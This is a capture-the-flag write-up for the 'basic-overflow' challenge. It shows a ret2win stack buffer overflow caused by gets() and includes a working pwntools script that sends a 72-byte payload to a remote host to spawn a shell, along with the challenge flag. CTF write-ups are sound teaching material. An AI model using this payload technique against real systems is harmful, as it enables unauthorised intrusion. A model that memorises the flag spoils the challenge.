# basic-overflow #

## Overview ##

Category: Binary Exploitation


Tags: `#Ret2win #Stack #Overflow #Write-What-Where #Underflow #Overwrite #Win #Flag #Pwntools #Ghidra #Checksec`

## Description ##

This challenge is simple.

It just gets input, stores it to a buffer.

It calls gets to read input, stores the read bytes to a buffer, then exits.

What is gets, you ask? Well, it's time you read the manual, no?

<span style="color:red;">nc 34.123.15.202 5000</span>
## Approach ##

Began by disassembling the `basic-overflow` binary within [Ghidra](https://ghidra-sre.org) and analysing the output.

Also checked the binary security with [pwntools](https://python3-pwntools.readthedocs.io/en/latest/index.html) `checksec` :

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

Upon examining the disassembled output, we encounter the main() function, which notably includes a call to gets(). This function is notorious for its security vulnerabilities, primarily because it lacks bounds checking for its input size. The relevant section of the code is as follows:

     undefined8 main(void)

      {
      char local_48 [64];
      gets(local_48);
      return 0;
      }

This usage of gets() immediately suggests that the program is susceptible to a buffer overflow attack. This vulnerability arises because gets() does not limit the amount of data read, potentially allowing more data than the allocated buffer size (local_48 in this case, which is 64 bytes) and thus overwriting adjacent memory.

As our analysis progresses, we also discover the shell() function. This function is evidently crafted to execute a shell, as indicated by its implementation:           
    
    void shell(void)

    {
       execve("/bin/sh",(char **)0x0,(char **)0x0);
       return;
    }


    

This is a well-known attack called ret2win in order to trigger the shell function we must firstly overwrite the return address of main() with the address of shell().
That's why we need to find the address of shell() in the binary. We can do this by using Ghidra's symbol tree to search for the function name. The address of shell() is `0x0000000000401136`.
Our offset is 72 bytes(64 bytes for local_48 + 8 bytes for the saved base pointer). We can use pwntools to send the payload to the binary.


## Solution ##



Final `pwntools` script used in the event :

    from pwn import*
 
    r=remote("34.123.15.202",5000)

    offset=72

    shell=p64(0x0000000000401136)
    payload=b"A"*72+shell

    r.sendline(payload)
    r.interactive()

After running the script, we can see that we have a shell. We can then use the `ls` command to list the files in the current directory, and `cat flag` to read the flag.


## Flag ##
`uoftctf{reading_manuals_is_very_fun}`